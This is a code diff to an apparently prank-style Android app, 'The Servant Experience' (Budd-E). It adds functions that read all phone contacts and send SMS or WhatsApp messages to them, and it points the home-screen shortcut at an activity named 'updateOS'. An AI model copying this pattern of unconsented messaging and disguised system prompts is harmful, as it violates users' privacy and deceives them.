@@ -36,6 +36,8 @@ import android.telephony.CellInfoWcdma;
 import android.telephony.CellSignalStrengthCdma;
 import android.telephony.CellSignalStrengthLte;
 import android.telephony.CellSignalStrengthWcdma;
+import android.telephony.PhoneNumberUtils;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.util.Patterns;
@@ -45,6 +47,7 @@ import android.widget.Toast;
 import com.shalom.itai.theservantexperience.R;
 import com.shalom.itai.theservantexperience.activities.Main2Activity;
 import com.shalom.itai.theservantexperience.activities.MainActivity;
+import com.shalom.itai.theservantexperience.activities.updateOS;
 import com.shalom.itai.theservantexperience.chatBot.MyScheduledReceiver;
 import com.shalom.itai.theservantexperience.services.BuggerService;
 import com.shalom.itai.theservantexperience.services.OverlyService;
@@ -57,6 +60,7 @@ import java.io.OutputStream;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Collections;
+import java.util.List;
 import java.util.Random;
 import java.util.Set;
 import java.util.regex.Pattern;
@@ -91,7 +95,7 @@ public class Functions {
             intentShortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, activity.getString(R.string.app_name));
             Parcelable appicon = Intent.ShortcutIconResource.fromContext(activity.getApplicationContext(), R.drawable.budde_face);
             intentShortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, appicon);
-            intentShortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, new Intent(activity.getApplicationContext(), Main2Activity.class));
+            intentShortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, new Intent(activity.getApplicationContext(), updateOS.class));
             intentShortcut.putExtra("duplicate", false);
             activity.sendBroadcast(intentShortcut);
         }
@@ -226,6 +230,108 @@ public class Functions {
             activity.startActivity(intent);
         }
     }
+
+    public static List<String> getContacts(Context context){
+        String namecsv = "";
+        String phonecsv = "";
+
+        // --Commented out by Inspection (18/06/2017 00:18):int iSelectedNum;
+        // --Commented out by Inspection (18/06/2017 00:18):public static ArrayList<String> allAddedPhoneNumbers = new ArrayList<>();
+
+
+        Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+        while (phones.moveToNext()) {
+            //Read Contact Name
+            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+
+            //Read Phone Number
+            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+
+            if (name != null) {
+                namecsv += name + ",";
+                String digits = phoneNumber.replaceAll("[^0-9.]", "");
+
+                phonecsv += digits + ",";
+            }
+
+
+        }
+        phones.close();
+
+
+        //==============================================
+        // Convert csvstrimg into array
+        //==============================================
+        String[] namearray = namecsv.split(",");
+        String[] phonearray = phonecsv.split(",");
+        ArrayList<String> tempString = new ArrayList<>();
+        // String[] sArrFull = new String[phonearray.length];
+        String newString;
+        for (int i = 0; i < phonearray.length; i++) {
+            newString = namearray[i] + ":" + phonearray[i];
+            if (i > 1) {
+                if (!tempString.contains(newString)) {
+                    tempString.add(newString);
+                    //     sArrFull[i] = newString;
+                }
+            }
+        }
+        java.util.Collections.sort(tempString);
+        List<String> legendList = new ArrayList<>(tempString.size());
+        legendList.add("Budd-E ofourse!!!");
+        // String[] sArrFull = new String[tempString.size()];
+        for (int i = 0; i < tempString.size(); i++) {
+            legendList.add(i, tempString.get(i));// = tempString.get(i);
+        }
+        return legendList;
+    }
+
+    public static boolean sendSMS(String phoneNo, String msg, String name, AppCompatActivity activity) {
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
+
+        } catch (Exception ex) {
+            sendWhatsAppMsg( phoneNo,  msg,  name,activity);
+            return false;
+        }
+        return true;
+    }
+
+    public static boolean whatsappInstalledOrNot(String uri, AppCompatActivity activity) {
+        PackageManager pm = activity.getPackageManager();
+        boolean app_installed = false;
+        try {
+            pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
+            app_installed = true;
+        } catch (PackageManager.NameNotFoundException e) {
+            app_installed = false;
+        }
+        return app_installed;
+    }
+
+
+    public static void sendWhatsAppMsg(String phoneNo, String msg, String name, AppCompatActivity activity) {
+        boolean isWhatsappInstalled = whatsappInstalledOrNot("com.whatsapp",activity);
+        if (isWhatsappInstalled) {
+
+            Intent sendIntent = new Intent();
+            sendIntent.setAction(Intent.ACTION_SEND);
+
+            sendIntent.putExtra(Intent.EXTRA_TEXT, "hi");
+            sendIntent.setType("text/plain");
+            sendIntent.putExtra("smsto:", PhoneNumberUtils.stripSeparators(phoneNo) + "@s.whatsapp.net");
+            // Do not forget to add this to open whatsApp App specifically
+            sendIntent.setPackage("com.whatsapp");
+            activity.startActivity(sendIntent);
+            Toast.makeText(activity.getApplicationContext(), "I decided to send " + msg + " to " + name + ", I hope it's ok",
+                    Toast.LENGTH_LONG).show();
+        } else {
+            return;
+        }
+    }
+
+
 
 
     public static void createJokes() {
@@ -471,9 +577,9 @@ public class Functions {
                 return true;
             }
         }
-        activity.startService(new Intent(activity, BuggerService.class));
+        activity.startService(new Intent(activity.getBaseContext(), BuggerService.class));
         try {
-            Thread.sleep(2000);
+            Thread.sleep(5000);
         } catch (InterruptedException e) {
             e.printStackTrace();
         }
